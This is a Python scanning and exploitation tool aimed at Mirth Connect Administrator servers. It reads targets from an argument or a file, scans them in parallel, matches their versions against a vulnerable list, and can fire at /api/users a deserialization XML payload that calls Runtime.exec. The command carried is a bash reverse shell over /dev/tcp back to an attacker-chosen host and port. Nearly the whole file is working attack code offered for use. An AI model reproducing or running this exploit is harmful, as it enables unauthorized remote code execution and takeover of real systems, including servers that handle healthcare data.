from colorama import Fore
import concurrent.futures
import requests
import argparse

# Suppress warnings from unverified HTTPS requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Argument parsing setup
parser = argparse.ArgumentParser(description="Scan and exploit vulnerable systems.")
parser.add_argument('-t', '--target', help="Target IP or hostname to scan.")
parser.add_argument('-f', '--file', help="File containing a list of IPs or hostnames to scan.")
parser.add_argument('-p', '--port', required=True, help="Port to scan.")
parser.add_argument('-e', '--exploit', action='store_true', help="Flag to trigger exploitation if a vulnerability is found.")
parser.add_argument('-lh', '--localhost', help="Localhost IP for reverse shell.")
parser.add_argument('-lp', '--localport', help="Local port for reverse shell.")

# Banner display
banner = f"""
{Fore.CYAN}
   _____  .__         __  .__      __________      _________  
  /     \ |__|_______/  |_|  |__   \______   \____ \_   ___ \ 
 /  \ /  \|  \_  __ \   __\  |  \   |     ___/  _ \/    \  \/ 
/    Y    \  ||  | \/|  | |   Y  \  |    |  (  <_> )     \____
\____|__  /__||__|   |__| |___|  /  |____|   \____/ \______  /
        \/                     \/                          \/ 

{Fore.WHITE}Author: {Fore.CYAN}c0deninja
{Fore.RESET}
"""
print(banner)

args = parser.parse_args()

# Default headers for requests
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/xml"
}

# List of known vulnerable versions
vulnerable_versions = ["4.1.1", "4.3.0", "4.4.0", "4.2.0", "3.8.1", "3.2.1", "3.8.0", "3.1", "3.5.1"]
version_endpoint = '/api/server/version'

def generate_exploit_payload(command: str) -> str:
    """
    Generates and returns an XML payload for the exploit.
    """
    xml_special_chars = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&apos;"
    }
    for special_char, escape_char in xml_special_chars.items():
        command = command.replace(special_char, escape_char)

    payload = f"""<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
        <target class="org.apache.commons.collections4.functors.ChainedTransformer">
            <iTransformers>
            <org.apache.commons.collections4.functors.ConstantTransformer>
                <iConstant class="java-class">java.lang.Runtime</iConstant>
            </org.apache.commons.collections4.functors.ConstantTransformer>
            <org.apache.commons.collections4.functors.InvokerTransformer>
                <iMethodName>getMethod</iMethodName>
                <iParamTypes>
                <java-class>java.lang.String</java-class>
                <java-class>[Ljava.lang.Class;</java-class>
                </iParamTypes>
                <iArgs>
                <string>getRuntime</string>
                <java-class-array/>
                </iArgs>
            </org.apache.commons.collections4.functors.InvokerTransformer>
            <org.apache.commons.collections4.functors.InvokerTransformer>
                <iMethodName>invoke</iMethodName>
                <iParamTypes>
                <java-class>java.lang.Object</java-class>
                <java-class>[Ljava.lang.Object;</java-class>
                </iParamTypes>
                <iArgs>
                <null/>
                <object-array/>
                </iArgs>
            </org.apache.commons.collections4.functors.InvokerTransformer>
            <org.apache.commons.collections4.functors.InvokerTransformer>
                <iMethodName>exec</iMethodName>
                <iParamTypes>
                <java-class>java.lang.String</java-class>
                </iParamTypes>
                <iArgs>
                <string>{command}</string>
                </iArgs>
            </org.apache.commons.collections4.functors.InvokerTransformer>
            </iTransformers>
        </target>
        <methodName>transform</methodName>
        <eventTypes>
            <string>compareTo</string>
        </eventTypes>
        </handler>
    </dynamic-proxy>
    </sorted-set>
    """
    return payload

def find_version_in_response(response_text: str) -> str:
    """
    Checks if the response text contains a known vulnerable version.
    """
    for version in vulnerable_versions:
        if version in response_text:
            return version
    return None

def is_mirth_connect_admin_page(domain: str) -> bool:
    """
    Determines if the target domain hosts a Mirth Connect Administrator page.
    """
    response = requests.get(domain, verify=False, headers=headers, timeout=10)
    return "Mirth Connect Administrator" in response.text

def check_vulnerability(domain: str, port: str) -> bool:
    """
    Checks if the specified domain and port are vulnerable.
    """
    formatted_domain = f"https://{domain}" if port == "443" else f"http://{domain}:{port}"
    try:
        response = requests.get(f"{formatted_domain}{version_endpoint}", verify=False, headers=headers, timeout=10)
        if is_mirth_connect_admin_page(formatted_domain) and find_version_in_response(response.text) in vulnerable_versions:
            print(f"{Fore.GREEN}[+] Found vulnerable Mirth Connect Administrator: {Fore.CYAN}{formatted_domain}{Fore.RESET}")
            return True
        else:
            print(f"{Fore.RED}[-] {formatted_domain} is not vulnerable.{Fore.RESET}")
            return False
    except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError):
        return False

def scan_target(target: str, port: str):
    """
    Scans the specified target for vulnerabilities.
    """
    if check_vulnerability(target, port) and args.exploit:
        exploit_target(target, port)

def exploit_target(target: str, port: str):
    """
    Attempts to exploit a vulnerability on the target.
    """
    # Command for reverse shell
    reverse_shell_command = f"bash -i >& /dev/tcp/{args.localhost}/{args.localport} 0>&1"
    # Generate the XML payload for exploitation
    payload = generate_exploit_payload(reverse_shell_command)
    # Format the target URL based on the specified port
    exploit_url = f"https://{target}" if port == "443" else f"http://{target}:{port}"
    # Endpoint to deliver the exploit payload
    exploit_endpoint = "/api/users"
    
    try:
        # Send the exploit payload to the target
        response = requests.post(f"{exploit_url}{exploit_endpoint}", data=payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Exploit successfully sent to {target}:{port}. Check your listener!{Fore.RESET}")
        else:
            print(f"{Fore.RED}[-] Exploit failed for {target}:{port} with HTTP status {response.status_code}.{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error sending exploit to {target}:{port} - {e}{Fore.RESET}")

if __name__ == "__main__":
    if args.target:
        scan_target(args.target, args.port)
    elif args.file:
        with open(args.file, "r") as file:
            targets = [line.strip() for line in file]
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(scan_target, target, args.port) for target in targets]
                concurrent.futures.wait(futures)
